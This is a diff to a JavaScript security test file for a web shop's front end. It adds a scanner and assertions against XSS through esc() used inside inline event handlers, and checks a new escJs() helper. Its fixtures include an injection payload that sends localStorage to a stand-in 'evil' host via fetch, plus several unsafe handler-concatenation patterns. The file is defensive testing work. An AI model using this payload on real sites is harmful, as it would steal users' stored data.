@@ -17,4 +17,28 @@ t('store.html reads the chip back through one click listener', /getElementById\(
 const esc = new Function(fs.readFileSync(path.join(root, 'app', 'helpers.js'), 'utf8').match(/function esc\(v\)[\s\S]*?\n\}/)[0] + '; return esc;')();
 const payload = "x');fetch('//evil/?'+btoa(JSON.stringify(localStorage)));//";
 t('the review\'s payload stays inside a data-cat attribute (no raw quote survives esc)', !/['"<>]/.test(esc(payload).replace(/&#39;|&quot;|&lt;|&gt;|&amp;/g, '')));
+/* reviews5 (GF-03 M8 · GF-05 M10 · EL-04 M14): esc() INSIDE a quoted JS argument of an inline handler. The browser decodes &#39; to ' before the
+   JS runs, so a value with a quote ends the string and the rest runs. The argument goes through escJs (helpers.js). Allowed leftover: the till
+   copy (vendored, the api master owns it), (this list only shrinks). */
+const inHandlerArg = /[(,]\s*(?:\\'['"]|'")\s*\+\s*esc\(/g;
+const allowLeft = /^(till.html)$/;
+const leaks = walk(root).filter((f) => /\.(html|js)$/.test(f) && !allowLeft.test(path.relative(root, f)))
+  .flatMap((f) => { const src = fs.readFileSync(f, 'utf8'); const out = []; let m; while ((m = inHandlerArg.exec(src))) out.push(path.relative(root, f) + ':' + (src.slice(0, m.index).split('\n').length)); return out; });
+t('no esc( inside a quoted JS argument of an inline handler (use escJs)', leaks.length === 0, leaks.slice(0, 8).join(', ') + (leaks.length > 8 ? ' … ' + leaks.length : ''));
+/* reviews7: the regex above needs "(" or "," before the quote; the scan below rebuilds the handler from the concatenation and finds EVERY form
+   (ontoggle="X[\'' + esc(k) …, ="_ARMED=\'rm:' + esc(id) …, template literals). */
+const { scanHandlerEsc } = require('./lib/handler-esc-scan.cjs');
+const leaks2 = walk(root).filter((f) => /\.(html|js)$/.test(f) && !allowLeft.test(path.relative(root, f)))
+  .flatMap((f) => scanHandlerEsc(fs.readFileSync(f, 'utf8')).map((h) => path.relative(root, f) + ':' + h.line));
+t('no esc( inside a single-quoted JS string of ANY inline handler, any concatenation form (use escJs)', leaks2.length === 0, leaks2.slice(0, 8).join(', ') + (leaks2.length > 8 ? ' … ' + leaks2.length : ''));
+const forms = [
+  "' ontoggle=\"S[\\'' + esc(k) + '\\']=1\"'", "'<b onclick=\"go(\\'' + esc(k) + '\\')\">'", "' onclick=\"A=\\'rm:' + esc(k) + '\\'\"'",
+  "`<b onclick=\"go('${esc(k)}')\">`", "'<b onclick=\"go(\\'' + escJs(k) + '\\')\">'"
+];
+t('the scan finds the four unsafe forms and passes the escJs one', forms.map((s) => scanHandlerEsc(s).length).join('') === '11110', forms.map((s) => scanHandlerEsc(s).length).join(''));
+const escJs = new Function(fs.readFileSync(path.join(root, 'app', 'helpers.js'), 'utf8').match(/function esc\(v\)[\s\S]*?\n\}/)[0] + fs.readFileSync(path.join(root, 'app', 'helpers.js'), 'utf8').match(/function escJs\(v\)[\s\S]*?\n\}/)[0] + '; return escJs;')();
+const attr = escJs(payload);
+const decoded = attr.replace(/&#39;/g, "'").replace(/&quot;/g, '"').replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&');
+t('escJs: the payload decoded as the browser does stays one string (no quote or backslash survives)', !/['"<>]/.test(decoded));
+t('escJs: the string value round-trips', new Function('return \'' + decoded + '\'')() === payload);
 process.exit(fail ? 1 : 0);
